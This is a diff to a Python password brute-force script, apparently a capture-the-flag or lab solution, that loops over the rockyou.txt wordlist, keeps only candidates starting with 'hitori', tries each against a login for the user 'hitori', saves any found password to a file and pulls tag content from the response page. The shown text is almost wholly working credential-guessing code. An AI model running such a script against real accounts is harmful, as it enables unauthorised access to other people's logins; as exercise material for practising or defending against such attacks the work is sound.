@@ -22,6 +22,10 @@ with open('rockyou.txt', 'r', encoding='latin-1') as rockyou:
 
         count += 1
         line = line.strip()
+
+        if line[0:6] != "hitori":   # tricky part
+            continue
+        
         print(f"try {count} password: {line}")
         set_login("hitori", line)
         while True:
@@ -44,8 +48,9 @@ with open('rockyou.txt', 'r', encoding='latin-1') as rockyou:
             with open('output.txt', 'w') as output_file:
                 output_file.write(f"found password!: {line}\n")  # Write to file
             soup = BeautifulSoup(response.text, 'html.parser')
-            tag_content = soup.find('code').text.strip()
-            print("Content within <code> tags:")
+            tag_content = soup.find('ADL').text.strip()
+            print("Content within tags:")
             print(tag_content)
+
             break
         # time.sleep(0.5)
